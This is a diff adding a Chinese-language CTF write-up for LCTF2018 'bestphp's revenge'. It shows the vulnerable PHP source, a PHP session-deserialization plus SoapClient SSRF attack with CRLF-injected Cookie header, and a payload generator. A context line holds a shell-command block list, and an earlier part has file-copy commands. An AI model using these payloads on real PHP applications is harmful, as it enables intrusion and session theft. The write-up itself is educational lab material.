@@ -1272,6 +1272,106 @@ if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmo
 
 
 
+` !,#,%,&,+,.,/,0-9,=,=,A-Z,\,^,_,a-z,~ `
+
+网络上搜索不同的字符串md5值却相同
+
+```
+dir /
+cp /flag /var/www/html
+```
+
+
+
+### bestphp's revenge
+
+index.php
+
+```php
+<?php
+highlight_file(__FILE__);
+$b = 'implode';
+call_user_func($_GET['f'], $_POST);
+session_start();
+if (isset($_GET['name'])) {
+    $_SESSION['name'] = $_GET['name'];
+}
+var_dump($_SESSION);
+$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
+call_user_func($b, $a);
+?>
+```
+
+给了我们两个call_user_func
+
+第一个完全可控,第二个部分可控,我们可以利用extract来修改$b
+
+
+
+
+
+
+
+flag.php
+
+```php
+
+session_start();
+echo 'only localhost can get flag!';
+$flag = 'LCTF{*************************}';
+if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
+       $_SESSION['flag'] = $flag;
+   }
+
+```
+
+
+
+
+
+这里要本地访问才能拿到flag,刚开始以为是http走私后来发现不太行
+
+
+
+这里我们要利用ssrf来拿到flag,但是我们没有ssrf的点
+
+但是这里又有session,于是想到session反序列化引擎配置错误+soap来进行ssrf
+
+但是soap需要调用`__call`函数
+
+我们可以在php官网上看到
+
+```php
+<?php
+
+namespace Foobar;
+
+class Foo {
+    static public function test() {
+        print "Hello world!\n";
+    }
+}
+
+call_user_func(__NAMESPACE__ .'\Foo::test'); // As of PHP 5.3.0
+call_user_func(array(__NAMESPACE__ .'\Foo', 'test')); // As of PHP 5.3.0
+
+?> 
+```
+
+于是演员都就位了
+
+```php
+<?php
+
+$location = 'http://127.0.0.1/flag.php';
+$a = new SoapClient(null, array('location' => $location ,'uri'  => $location,'user_agent'=>"111\r\nCookie: PHPSESSID=polh31264nsj4pc620uv0n2go5"));#,'user_agent'=>"111\r\nCookie: PHPSESSID=3e87aecc0fuqg5v6uap8i92i06"
+echo urlencode("|".serialize($a));
+```
+
+最后拿到flag
+
+
+
 
 
 ## jarvisoj
